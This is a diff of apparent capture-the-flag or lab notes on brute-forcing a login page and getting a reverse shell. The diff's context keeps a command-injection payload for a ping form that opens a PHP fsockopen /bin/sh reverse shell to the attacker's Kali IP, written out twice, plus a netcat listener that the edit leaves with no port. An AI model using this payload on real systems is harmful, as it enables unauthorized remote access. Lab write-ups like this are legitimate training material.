@@ -1,6 +1,4 @@
-
-
-### Brute Force the login page
+## Brute Force the login page
 
 
 
@@ -19,7 +17,7 @@ MACHINE_IP/login.php
 
 2. Gaining a Reverse Shell
     - Open a netcat listener in Kali terminal
-    ` nc -lnvp <port> `
+    ` nc -lnvp  `
 
     - Past this code in the 'Enter an IP address: ' form. Make sure to prepend an IP address for the ping command to run and the reverse shell to work.
     `8.8.8.8;php -r '$sock=fsockopen("<KaliMachineIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' php -r '$sock=fsockopen("<kaliMACHINEIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' `
